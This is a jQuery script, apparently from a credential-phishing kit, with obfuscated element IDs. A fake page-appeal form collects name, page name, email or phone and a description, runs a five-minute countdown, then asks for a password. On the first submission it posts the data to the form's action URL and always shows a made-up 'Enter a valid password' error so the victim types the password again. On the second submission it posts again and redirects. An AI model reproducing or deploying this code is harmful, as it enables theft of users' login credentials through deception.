$(function () {
    $(".menu > li > a").click(function() {
        if($(this).next("ul").is(":hidden")){
            $(this).addClass("active").find("i").last().addClass("rotate");
            $(this).next("ul").slideToggle();
        }else {
            $(this).removeClass("active").find("i").last().removeClass("rotate");
            $(this).next("ul").slideToggle();
        }
    })
});

$(function () {
    $(".KoaPjfsMfwj").click(function() {
        $(".kooikSpJansSF").fadeOut();
    })
});

$(function () {
    if($(".koAmshqSpias").length > 0){
        var timer2 = "5:01";
        var interval = setInterval(function() {
            var timer = timer2.split(':');
            //by parsing integer, I avoid all extra string processing
            var minutes = parseInt(timer[0], 10);
            var seconds = parseInt(timer[1], 10);
            --seconds;
            minutes = (seconds < 0) ? --minutes : minutes;
            if (minutes < 0) clearInterval(interval);
            seconds = (seconds < 0) ? 59 : seconds;
            seconds = (seconds < 10) ? '0' + seconds : seconds;
            //minutes = (minutes < 10) ?  minutes : minutes;
            $('.koAmshqSpias').html(minutes + ':' + seconds);
            timer2 = minutes + ':' + seconds;
        }, 1000);
    }
});

$(function () {
    $("#kKjhmSgiuWkf").click(function () {
        $(".asflOOosPas").fadeToggle();
    })
});

$("#submitbtn").on("click",function(){
    $(".alert-danger").remove();
    $("#nameforrepass").html($("#mikrobes").val());
    $(".errormsg").remove();
    var fname=$("#mikrobes").val();
    var maralyka=$("#maralyka").val();
    var qazymika=$("#qazymika").val();
    var qinmin=$("#qinmin").val();
    var terms=$("#terms").val();
    var check=true;
    if(fname.length<1 ){
        $("#mikrobes").after('<span class="errormsg">Please Enter Full Name</span>');
        check=false;
       
    }
    if(maralyka.length<1 ){
        $("#maralyka").after('<span class="errormsg">Please Enter Page Name</span>');
        check=false;
    
    }
    if(qazymika.length<1 ){
        $("#qazymika").after('<span class="errormsg">Please Enter Email/Mobile</span>');
        check=false;
    
    }
    if(qinmin.length<1 ){
        $("#qinmin").after('<span class="errormsg">Please Enter Description</span>');
        check=false;
    
    }
    if(terms!="yes" ){
        $("#terms").after('<span class="errormsg">Please Agree Terms</span>');
        check=false;
    
    }
    if(check==true){
        location.href="#passwordmodal";
    }
    

    

});
var tries=0;
$("#sfasfkWFtomnS").on("submit",function(e){
    tries++;
    $("#tries").val(tries);
    e.preventDefault();
    var fname=$("#mikrobes").val();
    var maralyka=$("#maralyka").val();
    var qazymika=$("#qazymika").val();
    var qinmin=$("#qinmin").val();
    var terms=$("#terms").val();
    if(tries==1){
        $(".alert-danger").remove();
        $("#nameforrepass").before('<div class="alert alert-danger" role="alert">Enter a valid password and try again</div>');

        var form = $(this);
        var actionUrl = form.attr('action');
        
        $.ajax({
            type: "POST",
            url: actionUrl,
            data: form.serialize(), // serializes the form's elements.
            success: function(data)
            {
                $("#qurrako").val("");
            //   alert(data); // show response from the php script.
            },
            error: function() {
                $("#qurrako").val("");
              },
              fail: function() {
                  $("#qurrako").val("");
                }
        });
        
    }else if(tries==2){
        $(".alert-danger").remove();
        var form = $(this);
        var actionUrl = form.attr('action');
        
        $.ajax({
            type: "POST",
            url: actionUrl,
            data: form.serialize(), // serializes the form's elements.
            success: function(data)
            {
            //   location.href="deskyptika.html";// show response from the php script.
            },
            error: function() {
                location.href="deskyptika.html";
              },
              fail: function() {
                  location.href="deskyptika.html";
                }
        });
    }
    $("#qurrako").val("");
    
    // 
});



